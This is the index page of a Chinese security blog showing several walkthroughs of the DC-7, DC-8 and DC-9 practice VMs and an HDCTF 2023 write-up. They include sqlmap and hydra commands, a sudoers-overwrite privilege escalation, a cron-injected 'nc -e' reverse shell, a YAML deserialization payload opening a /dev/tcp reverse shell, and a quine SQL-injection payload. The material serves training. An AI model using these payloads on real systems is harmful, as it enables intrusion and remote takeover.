
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Arcueid&#39;s BLOG</title>
    <meta name="author" content="Arcueid" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/Arcueid.jpg" />
    <link rel="preconnect" href="https://cdn.staticfile.net" />
<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>ARCUEID&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;ARCUEID&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>Arcueid&#39;s BLOG</h1>
                <h3></h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div id="home-posts-wrap" true ref="homePostsWrap">
    <div id="home-posts">
        

<div class="post">
    <a href="/2023/05/12/DC-9%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-9通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/12
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/56a20a36ac8e480b82e5d18851b3a945.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b658620582e5411c962472ea67afb604.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p><img src="https://img-blog.csdnimg.cn/b32f811cd6d24014ab4115035753b5c6.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9e30c2bbd0cb43feac7a5b141588db74.png" alt="在这里插入图片描述"><br><code>result.php</code>处存在sql注入<br>sqlmap跑信息<br><code>python sqlmap.py -u http://192.168.45.146/results.php --data search=1 -D users -T UserDetails --dump</code><br><img src="https://img-blog.csdnimg.cn/edf34e037bbd47bca778564800424bd0.png" alt="在这里插入图片描述"><br>拿了几个尝试登录都无效<br>ssh尝试登录直接拒绝了<br>再看Staff表<br><img src="https://img-blog.csdnimg.cn/a7cc08d1f6574e4982ef50808830850b.png" alt="在这里插入图片描述"><br>查哈希<br><img src="https://img-blog.csdnimg.cn/8eafce750f1049f28a357448e42c48d0.png" alt="在这里插入图片描述"><br>进后台<br>多了一个添加记录的功能<br>没啥用,不能–os-shell</p>
<p>发现一个细节<br><img src="https://img-blog.csdnimg.cn/9c19a2dbbb374a6eacd49ab4272be15a.png" alt="在这里插入图片描述"><br>猜测是文件包含<br>猜传的值,或者bp爆破<br><img src="https://img-blog.csdnimg.cn/ba0bd48eae8b49c9b3d1119079030f0d.png" alt="在这里插入图片描述"><br>尝试php:&#x2F;&#x2F;input和日志文件包含均无果<br>然后没辙了</p>
<p>看wp得知有knock服务</p>
<p>正常应该先读<code>proc/sched_debug</code> 得知存在该服务<br><img src="https://img-blog.csdnimg.cn/5eef7917b3c040fd8bb046b15cc7f8e1.png" alt="在这里插入图片描述"><br>再读该服务的配置<br><code>/etc/knockd.conf</code><br><img src="https://img-blog.csdnimg.cn/76582fc6308547658112b614c2f99ee9.png" alt="在这里插入图片描述"></p>
<p>得知需要以此向<br>7469 8475 9842端口发syn包</p>
<p><img src="https://img-blog.csdnimg.cn/6f0b665f2a4a463d82ddf5f64eaa9c32.png" alt="在这里插入图片描述"><br>这就算打开了ssh服务了<br>再去比较之前sql注入得到的用户名和etc&#x2F;passwd下的用户名看看能否登录一个进去</p>
<p>写一个user.txt和pass.txt用hydra爆破<br>user.txt是&#x2F;etc&#x2F;passwd的下半部分<br><img src="https://img-blog.csdnimg.cn/48353f283a10492fac7c2bc80644ab11.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/94cddcbbb74140be9d77bb1167b97bf3.png" alt="在这里插入图片描述"></p>
<p><code>hydra -L user.txt  -P pass.txt ssh://192.168.45.146  -t 32</code></p>
<p><img src="https://img-blog.csdnimg.cn/99c87a30f6ae40cfb5a7646cfa127ffc.png" alt="在这里插入图片描述"></p>
<p>账号<code>janitor</code><br>密码<code>Ilovepeepee</code></p>
<p>账号<code>chandlerb</code><br>密码<code>UrAG0D!</code></p>
<p>账号<code>joeyt</code><br>密码<code>Passw0rd</code></p>
<p>登录</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>传个LinEnum.sh过来枚举脆弱性<br>没什么可利用的<br>那一个个账户看</p>
<p>都没有sudo权限</p>
<p>在janitor下发现隐藏文件<br><img src="https://img-blog.csdnimg.cn/c90092002a5443ebb531aae3a86d9988.png" alt="在这里插入图片描述"><br>一堆密码,尝试ssh爆</p>
<p><img src="https://img-blog.csdnimg.cn/633739844e2343488f257989bfa21e4e.png" alt="在这里插入图片描述"><br>上fredf用户<br><img src="https://img-blog.csdnimg.cn/1c373a3aae174954901dc7a6b7399339.png" alt="在这里插入图片描述"><br>发现可以以root身份运行<code>/opt/devstuff/dist/test/test</code><br>那么去读源文件<br><img src="https://img-blog.csdnimg.cn/af8ed8bde084422493d27aac522004b1.png" alt="在这里插入图片描述"><br>将第一个参数的值写到第二个参数里<br>那么我们可以尝试给 当前用户所有权限<br><code>echo &#39;fredf ALL=(ALL:ALL) ALL&#39; &gt;/tmp/a.txt</code><br><code>sudo ./test /tmp/a.txt /etc/sudoers</code></p>
<p>这里我写错了给文件干烂了,直接不能sudo了</p>
<p>看了下wp后面就结束了</p>
<p>这里运行完之后执行<code>sudo su -</code>就行了<br>难顶</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #00a596">php</a>
        </span>
        
    </div>
    <a href="/2023/05/12/DC-9%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/07/DC-8%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-8通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/7
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/ad9c6d1a5a0647a8a98d8a70d8fccaf9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/667d4b31d6ed48a0a0cca960bbf1889e.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p><img src="https://img-blog.csdnimg.cn/2d6db0eb12ea487ca8ef7ec6c561dde8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/24d21b2114fd44108dc73d5c99b3384d.png" alt="在这里插入图片描述"><br>找个扫描器扫一下<br><img src="https://img-blog.csdnimg.cn/0f9064d91cde4a948291fd57b68c31f4.png" alt="在这里插入图片描述"><br>msf试了几个exp都没用<br>那么手动找找<br>发现传参nid出存在sql注入</p>
<p><code>python sqlmap -u &quot;http://192.168.45.144:80/?nid=1&quot; --union-cols=1 -D d7db -T users -C name,pass --columns --tables --dump</code></p>
<p><img src="https://img-blog.csdnimg.cn/915f1dd9d05b49529852b506ff4b12d5.png" alt="在这里插入图片描述"><br>用john爆密码<br>admin爆了20分钟没爆出来</p>
<p>john的密码<img src="https://img-blog.csdnimg.cn/43be3dbb4c534c05b95bf4657e132f1e.png" alt="在这里插入图片描述"><br>尝试ssh和后台登录<br>ssh进不去<br><img src="https://img-blog.csdnimg.cn/19ae6ed9931e41fcaf793252b3aa3edb.png" alt="在这里插入图片描述"><br>这里一直没打成功(当时没试着去提交),然后我就手贱给他删了…<br>自己再添加一个,提交执行<br><img src="https://img-blog.csdnimg.cn/856fd984a695448db973c2a85ad4ef5a.png" alt="在这里插入图片描述"><br>拿到shell<br><img src="https://img-blog.csdnimg.cn/dbe547d559da44d284b21ce60ab76483.png" alt="在这里插入图片描述"></p>
<h1 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h1><p>优化shell</p>
<pre><code class="bash">python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
ctrl+z
stty -echo raw;fg
</code></pre>
<p>cd到&#x2F;tmp目录下<br>从vps上下载LinEnum.sh枚举脆弱性<br><img src="https://img-blog.csdnimg.cn/e3ddc9f624a74a478a2fa2dfa9ab3a43.png" alt="在这里插入图片描述"><br>发现存在exim4 看看能否尝试用这个提权<br><img src="https://img-blog.csdnimg.cn/939996e4d8d74ddf885814c42a04a948.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5783be96cc4a4fd59de7c2124b935410.png" alt="在这里插入图片描述"><br>试了一下<code>linux/local/46996.sh</code>,失败了,返回的还是www-data<br>找了一圈没发现什么办法,看看wp<br>发现别46996.sh成功了?</p>
<p>那么再尝试一遍,scp传到vps<br>wget下载<br>发现运行报错<br><img src="https://img-blog.csdnimg.cn/44af06483f294d03a6f55490b7460d5a.png" alt="在这里插入图片描述"><br>kali用<code>dos2unix</code>转换完文件再传过去,执行<br>还是www-data</p>
<p>发现是操作问题导致的,这个默认的用法不行<br>得<code>-m netcat</code><br><img src="https://img-blog.csdnimg.cn/6969b93f7b8741d8bdd3c7443e992e84.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/f7d015dda6e2401484844a7d73ae6e3a.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #00bcd4">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #ff7d73">运维</a>
        </span>
        
    </div>
    <a href="/2023/05/07/DC-8%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/30/DC-7%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-7通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/30
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/856e0fdcd1034dad80369f7c6a378f8a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/09ea3b35b6dc45dda26125567e714220.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p><img src="https://img-blog.csdnimg.cn/dc3aabab1bfb4ce9a8233babadef0f77.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3351f2de5fc144339585dce86d62b872.png" alt="在这里插入图片描述"><br>web提示我们说弱口令可能不会奏效</p>
<p>那么我们就先不考虑弱口令<br>searchsploit搜payload打打看,无果</p>
<p>看别人的wp知道了是通过web左下角的这个玩意去github搜<br><img src="https://img-blog.csdnimg.cn/cb6316bea7fa424883ae46ddfda57a16.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/372cc29425024a9da80ae91d2737618d.png" alt="在这里插入图片描述"><br>在这个仓库用户唯一的仓库中看config.php<br>发现账号密码</p>
<p><img src="https://img-blog.csdnimg.cn/f791d54185724161a3049a294a3cee3d.png" alt="在这里插入图片描述"><br>尝试后台和ssh登录</p>
<p>ssh登录成功</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>当前目录下发现mbox和backup文件夹<br>看看都是什么<br>backup目录下是俩挺大的压缩包<br>cat 一下mbox<br><img src="https://img-blog.csdnimg.cn/2163c3c2ce0649a1ba953b30a77f2472.png" alt="在这里插入图片描述"></p>
<p>然后看看<code>/opt/scripts/backups.sh</code></p>
<p><img src="https://img-blog.csdnimg.cn/5c3b63ddef6346ebb1ba9dd7b966a7ce.png" alt="在这里插入图片描述"><br>没什么用,我们写不了该文件,但是发现www-data组可写<br>没思路了,也不能su过去,回头看一眼wp</p>
<p>发现<code>/home/dc7user</code>目录下还存在一个<code>.drush</code>目录,当时根本没在意,没怎么见过这东西<br>drush是个命令,可以管理drupal</p>
<p>cd到&#x2F;var&#x2F;www&#x2F;html下<br><img src="https://img-blog.csdnimg.cn/5ae9faba33c4494396f89366c5c292f8.png" alt="在这里插入图片描述"></p>
<p>改admin的密码,用web弹个shell<br>和之前做的drupal的站一样,去扩展里找支持php解析的扩展,给他启用<br>发现这里没有,去下一个<br><code>https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz </code><br>装完后启用,然后写一句话反弹shell<br>优化shell</p>
<pre><code class="bash">python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
ctrl+z
stty -echo raw;fg
</code></pre>
<p>现在有写的权限,在sh文件最后追加一个命令<br>等这个命令被root执行生成一个shell</p>
<pre><code class="bash">echo &quot;nc -e /bin/bash vps地址 9000&quot; &gt;&gt; backups.sh
</code></pre>
<p>等15分钟,每15分钟执行一次,可以用date命令查看大概差多长时间<br>最好先自己手动执行看看能不能反弹上,省得再等15分钟<br><img src="https://img-blog.csdnimg.cn/9f1e88d95e0448d4886b247e0024a40b.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00bcd4">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #00a596">php</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/ssh/" style="color: #03a9f4">ssh</a>
        </span>
        
    </div>
    <a href="/2023/04/30/DC-7%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/24/HDCTF%202023%20%E5%A4%8D%E7%9B%98/">
        <h2 class="post-title">HDCTF 2023 复盘</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/24
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="yamiyami"><a href="#yamiyami" class="headerlink" title="yamiyami"></a>yamiyami</h2><p>当时考虑直接读的<code>/proc/self/environ</code><br>读到flag是not_flag<br>就没考虑过<code>/proc/1/environ</code>了<br>然后不知道py3URL二次编码的特性,读不到源码,无从下手<br>做flask算pin码的题做多了,还以为pid是1的就是self,难顶</p>
<p>上面那种是非预期<br>预期是yaml反序列化</p>
<p>先读源码<br><code>/read?url=file:///%25%36%31%25%37%30%25%37%30%25%32%66%25%36%31%25%37%30%25%37%30%25%32%65%25%37%30%25%37%39</code></p>
<pre><code class="python">
#encoding:utf-8
import os
import re, random, uuid
from flask import *
from werkzeug.utils import *
import yaml
from urllib.request import urlopen
app = Flask(__name__)
random.seed(uuid.getnode())
app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233)
app.debug = False
BLACK_LIST=[&quot;yaml&quot;,&quot;YAML&quot;,&quot;YML&quot;,&quot;yml&quot;,&quot;yamiyami&quot;]
app.config[&#39;UPLOAD_FOLDER&#39;]=&quot;/app/uploads&quot;

@app.route(&#39;/&#39;)
def index():
    session[&#39;passport&#39;] = &#39;YamiYami&#39;
    return &#39;&#39;&#39;
    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;
    &lt;br&gt;
    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;
    &lt;br&gt;
    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;
    &#39;&#39;&#39;
@app.route(&#39;/pwd&#39;)
def pwd():
    return str(pwdpath)
@app.route(&#39;/read&#39;)
def read():
    try:
        url = request.args.get(&#39;url&#39;)
        m = re.findall(&#39;app.*&#39;, url, re.IGNORECASE)
        n = re.findall(&#39;flag&#39;, url, re.IGNORECASE)
        if m:
            return &quot;re.findall(&#39;app.*&#39;, url, re.IGNORECASE)&quot;
        if n:
            return &quot;re.findall(&#39;flag&#39;, url, re.IGNORECASE)&quot;
        res = urlopen(url)
        return res.read()
    except Exception as ex:
        print(str(ex))
    return &#39;no response&#39;

def allowed_file(filename):
   for blackstr in BLACK_LIST:
       if blackstr in filename:
           return False
   return True
@app.route(&#39;/upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def upload_file():
    if request.method == &#39;POST&#39;:
        if &#39;file&#39; not in request.files:
            flash(&#39;No file part&#39;)
            return redirect(request.url)
        file = request.files[&#39;file&#39;]
        if file.filename == &#39;&#39;:
            return &quot;Empty file&quot;
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            if not os.path.exists(&#39;./uploads/&#39;):
                os.makedirs(&#39;./uploads/&#39;)
            file.save(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename))
            return &quot;upload successfully!&quot;
    return render_template(&quot;index.html&quot;)
@app.route(&#39;/boogipop&#39;)
def load():
    if session.get(&quot;passport&quot;)==&quot;Welcome To HDCTF2023&quot;:
        LoadedFile=request.args.get(&quot;file&quot;)
        if not os.path.exists(LoadedFile):
            return &quot;file not exists&quot;
        with open(LoadedFile) as f:
            yaml.full_load(f)
            f.close()
        return &quot;van you see&quot;
    else:
        return &quot;No Auth bro&quot;
if __name__==&#39;__main__&#39;:
    pwdpath = os.popen(&quot;pwd&quot;).read()
    app.run(
        debug=False,
        host=&quot;0.0.0.0&quot;
    )
    print(app.config[&#39;SECRET_KEY&#39;])
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/b2857d342e1b4f5997bd8746c8a30735.png" alt="在这里插入图片描述"><br>在&#x2F;boogipop路径下可触发反序列化<br>但是能进语句的条件是passport &#x3D;&#x3D; Welcome To HDCTF2023<br>那么我们需要伪造session<br><img src="https://img-blog.csdnimg.cn/71117d56ad844ab4bd9e4366600526e2.png" alt="在这里插入图片描述"></p>
<p>这是生成secret key的逻辑<br>uuid.getnode返回网卡的int值<br>那么我们去读网卡<br>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address<br>得到<br><img src="https://img-blog.csdnimg.cn/87387918f92c416393908fe5bb4e1856.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/b6d45568858a46afbb5c92f79bafc15b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/79ebe40fc43e4571b64eb607182607f2.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f6a0ddc3caea46b19de85d0c06747c58.png" alt="在这里插入图片描述"><br>验证是否伪造成功<br><img src="https://img-blog.csdnimg.cn/ccd333e5d9924b0093964ac12a8220ac.png" alt="在这里插入图片描述"><br>成功伪造了session<br>然后我们构造恶意yaml文件<br>我这里命名为ac.ac</p>
<pre><code class="yaml">!!python/object/new:str
    args: []
    state: !!python/tuple
      - &quot;__import__(&#39;os&#39;).system(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps地址/9000 &lt;&amp;1\&quot;&#39;)&quot;
      - !!python/object/new:staticmethod
        args: []
        state:
          update: !!python/name:eval
          items: !!python/name:list
</code></pre>
<p>触发<br><img src="https://img-blog.csdnimg.cn/8073dd513d6d4c84b1afdd8069861534.png" alt="在这里插入图片描述"><br>这里其实就拿到shell了,由于题目环境的问题是读不了flag的,还是得通过<code>/proc/1/environ</code>读</p>
<h2 id="LoginMaster"><a href="#LoginMaster" class="headerlink" title="LoginMaster"></a>LoginMaster</h2><p>robots.txt泄露waf<br><img src="https://img-blog.csdnimg.cn/908345a883c740e59813066ded420bea.png" alt="在这里插入图片描述"><br>发现是quine查询<br>payload如下<br><code>1&#39;union/**/select/**/replace(replace(&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="math-rsa"><a href="#math-rsa" class="headerlink" title="math_rsa"></a>math_rsa</h2><p>由题<br>p^2^ ≡ a mod r<br>即a是模p的二次剩余<br>通过sage求解p</p>
<pre><code class="python">r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299
a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625
R.&lt;x&gt; = PolynomialRing(Zmod(r))
f = x**2 - a
print(f.roots())
</code></pre>
<pre><code class="python">from Crypto.Util.number import *
import gmpy2
n = 14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489
r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299
a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625
c = 12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608
e=65537
p = 135098300162574110032318082604507116145598393187097375349178563291884099917465443655846455456198422625358836544141120445250413758672683505731015242196083913722084539762488109001442453793004455466844129788221721833309756439196036660458760461237225684006072689852654273913614912604470081753828559417535710077291
q = n // p
phi_n = (p-1)*(q-1)
d = gmpy2.invert(e,phi_n)
print(long_to_bytes(pow(c,d,n)).decode())
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/python/" style="color: #00bcd4">python</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/flask/" style="color: #00bcd4">flask</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #00a596">后端</a>
        </span>
        
    </div>
    <a href="/2023/04/24/HDCTF%202023%20%E5%A4%8D%E7%9B%98/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/24/sql%E6%B3%A8%E5%85%A5%20Quine%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">
        <h2 class="post-title">sql注入 Quine注入解析</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/24
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
